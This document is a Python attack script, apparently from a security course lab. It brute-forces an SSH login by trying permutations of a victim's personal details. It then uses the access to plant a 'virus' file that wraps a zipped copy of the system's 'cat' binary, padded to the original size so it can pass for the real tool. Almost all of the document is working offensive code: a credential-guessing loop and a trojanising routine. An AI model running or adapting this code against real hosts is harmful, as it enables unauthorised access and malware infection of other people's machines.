#!/usr/bin/env python3
from itertools import combinations, permutations
import paramiko
import socket
import time
import sys

def crack_ssh_passwd(victim_ip:str, username:str):
    '''
    
    '''
    # open and read victim's personal information
    info_file = open('/home/csc2023/materials/victim.dat', 'r')
    info = info_file.read().splitlines()

    # iterate through all possible passwd combination based on victim's personal information
    for combination_len in range(1, len(info) + 1):
        for combinations_list in combinations(info, combination_len):
            for passwd in permutations(combinations_list):
                client = crack(victim_ip, username, ''.join(passwd))
                if client:
                    return client
                
def infect_cat(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
    '''
    
    '''
    with open('virus.py', 'r') as f:
        virus_content = f.read()

    # 
    _stdin, stdout, stderr = client.exec_command('echo "' + virus_content + '" > virus')
    if stdout.read(): print('stdout: ' + stdout.read().decode())
    if stderr.read(): print('stderr: ' + stderr.read().decode())

    _stdin, stdout, stderr = client.exec_command("""
        zip -q new_cat cat;
        ls -l cat | awk {'print $5'};
        ls -l new_cat.zip | awk {'print $5'};
        ls -l virus | awk {'print $5'};
        cat new_cat.zip >> virus;
        rm -f new_cat.zip;
    """)
    sizes = stdout.read().decode().splitlines()
    padding_size = int(sizes[0]) - int(sizes[1]) - int(sizes[2]) - 8

    _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> virus;')
    _stdin, stdout, stderr = client.exec_command("""
        echo -n "deadbeaf" >> virus;
        chmod +x virus;
        """)
    if stdout.read(): print('stdout:', stdout.read().decode())
    if stderr.read(): print('stderr:', stderr.read().decode())

def crack(victim_ip:str, username:str, passwd:str):
    '''

    '''
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=victim_ip, username=username, password=passwd, timeout=3)
        print(f"[+] Cracked: {username}:{passwd}")
        return client
    # authentication failed
    except paramiko.AuthenticationException:
        print(f"[!] Authentication failed for {username}:{passwd}")
        return None
    # host unreachable
    except socket.timeout:
        print(f"[!] {victim_ip} is unreachable, timeout.")
        return None
    # there was any other error connecting or establishing an SSH session
    except paramiko.SSHException:
        print(f"[!] Something wrong, retrying...")
        time.sleep(2)
        return crack(victim_ip, username, passwd)

if __name__ == '__main__':
    victim_ip = sys.argv[1]
    victim_name = 'csc2023'
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    # task1
    client = crack_ssh_passwd(victim_ip, victim_name)
    # task 2
    infect_cat(client, attacker_ip, attacker_port)
